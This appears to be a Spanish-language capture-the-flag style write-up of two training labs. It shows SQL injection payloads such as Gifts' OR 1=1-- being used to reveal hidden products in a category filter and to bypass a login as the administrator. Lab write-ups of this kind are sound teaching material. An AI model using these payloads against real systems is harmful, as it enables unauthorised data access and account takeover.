# SQL Injection

## Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

### Enunciado

Este laboratorio contiene una vulnerabilidad de inyección SQL en el filtro de categoría de productos. Cuando el usuario selecciona una categoría, la aplicación realiza una consulta SQL como la siguiente:

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

Para resolver el laboratorio, realiza un ataque de inyección SQL que provoque que la aplicación muestre uno o más productos **no publicados**.

### Resolución

Al capturar la petición vemos que hay un error que no se contempla ya que si ponemos una comilla simple detrás de **Gifts** comentamos el resto de la sentencia.

```
SELECT * FROM products WHERE category = 'Gifts'' AND released = 1
```

Sabiendo esto hacemos la búsqueda:

```bash
?category=Gifts'--
```

Podemos observar como salen 4 elementos cuando salían 3 anteriormente.

<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

Podemos ver que hay una inyección por lo que realizamos esta sentencia.

```
SELECT * FROM products WHERE category = 'Gifts' AND 1=1--' AND released = 1
```

Lo añadimos en la búsqueda y vemos que es vulnerable el parámetro **categories**. Volviendo al enunciado realizamos esta sentencia para resolverlo.

```
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```

Lo ponemos en la búsqueda.

```
?category=Gifts' OR 1=1--'
```

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Lab: SQL injection vulnerability allowing login bypass

### Enunciado

Este laboratorio contiene una vulnerabilidad de inyección SQL en la función de inicio de sesión.

Para resolver el laboratorio, realiza un ataque de inyección SQL que inicie sesión en la aplicación como el usuario **administrador**.

### Resolución

Lo primero que probamos que el usuario no es la misma contraseña. La consulta sería:&#x20;

```
SELECT * FROM usuarios WHERE username='administrator' AND contraseña= 'administrator'
```

Pero no sabemos la contraseña. Como dijimos anteriormente si metemos una comilla simple en el campo de **password** comprobamos que es vulnerable.

```
SELECT * FROM usuarios WHERE username='administrator' AND contraseña= '' OR 1=1--'
```

Por lo tanto insertamos eso en el login.

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
